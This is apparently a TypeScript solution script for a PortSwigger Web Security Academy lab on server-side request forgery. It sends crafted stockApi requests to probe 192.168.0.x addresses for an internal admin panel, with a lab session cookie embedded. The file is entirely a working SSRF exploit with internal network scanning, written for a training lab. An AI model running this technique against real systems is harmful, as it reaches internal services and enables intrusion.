/**
 * PortSwigger Lab: Basic SSRF against another back-end system
 * https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
 */

import { Sess } from "../base"

const LABID = "0a15005a037a0b8ab8d95e27003b00d3"

const iter = async (number: number) => {
	return await Sess.req`
		POST /product/stock HTTP/2
		Host: ${LABID}.web-security-academy.net
		Cookie: session=WWfbbcARskKmS8vhaEMTpC7cSbkgghYX
		Content-Length: 96
		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
		Sec-Ch-Ua-Platform: "macOS"
		Sec-Ch-Ua-Mobile: ?0
		User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
		Content-Type: application/x-www-form-urlencoded
		Accept: */*
		Sec-Gpc: 1
		Accept-Language: en-GB,en;q=0.9
		Origin: https://${LABID}.web-security-academy.net
		Sec-Fetch-Site: same-origin
		Sec-Fetch-Mode: cors
		Sec-Fetch-Dest: empty
		Referer: https://${LABID}.web-security-academy.net/product?productId=1
		Accept-Encoding: gzip, deflate, br

		stockApi=${encodeURIComponent(`http://192.168.0.${number}:8080/admin`)}
	`.then(r => r.status() !== 500)
}

for (let i = 2; i < 256; i++) {
	if (await iter(i)) {
		console.log(`IP SUCCESS: 192.168.0.${i}`)
		break
	} else {
		console.log(`IP FAILURE: 192.168.0.${i}`)
	}
}
